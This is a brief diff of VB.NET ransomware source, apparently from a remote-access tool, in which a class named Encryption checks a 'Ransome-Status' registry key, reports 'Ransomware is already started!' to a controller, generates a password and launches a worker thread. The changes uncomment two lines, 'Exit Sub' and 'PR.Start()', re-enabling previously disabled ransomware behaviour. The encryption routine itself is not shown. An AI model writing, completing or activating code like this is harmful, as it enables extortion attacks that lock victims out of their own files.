@@ -93,7 +93,7 @@ Public Class Encryption
             Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
             If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Encryption in progress..." Then
                 Main.C.Send("MSG" + Main.SPL + "Ransomware is already started!")
-                '  Exit Sub
+                Exit Sub
             End If
             password = CreatePassword(15)
             Threading.Thread.CurrentThread.Sleep(1000)
@@ -121,7 +121,7 @@ Public Class Encryption
             SC()
 
             Dim PR As New Threading.Thread(AddressOf Proc)
-            '   PR.Start()
+            PR.Start()
             Exit Sub
         Catch ex As Exception
         End Try
